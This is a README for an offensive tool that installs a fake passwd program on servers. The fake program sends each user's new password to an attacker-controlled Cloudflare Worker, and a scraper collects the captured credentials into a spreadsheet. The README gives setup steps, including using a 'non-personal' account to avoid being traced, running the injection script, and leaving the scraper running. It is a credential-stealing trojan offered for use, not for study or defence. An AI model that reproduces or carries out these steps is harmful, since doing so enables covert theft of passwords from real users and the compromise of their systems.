This script injects a fake ```passwd``` program that acts like a real ```passwd``` and sends new password data to you every time the user changes the password. Can be done for any amount of users at once. Needs user current password and user_name@server_id.

You can find all the scraped passwords in ```credentials.xlsx``` after the script in executed and the user has changed his password.

## Steps

### 0. Set up
- Use Linux.
- Create a Python virtual environment in the root directory.
- Rename `config.json.example` to `config.json`.

### 1. Set up web server to read and write data:
- use cloudflare with non-personal account
- host a worker
- add a KV namespace named `LOGS`
- give worker `worker.js` code
- add KV `LOGS` to the worker via settings
- save url to the website to `config.json`

### 2. Inject script:
- fill the rest of `config.json` (use example as a reference)
- from root run `./runall.sh`

### 3. Scrape data:
- from root run  `python scraper/` (should always run, to monitor the website for changes)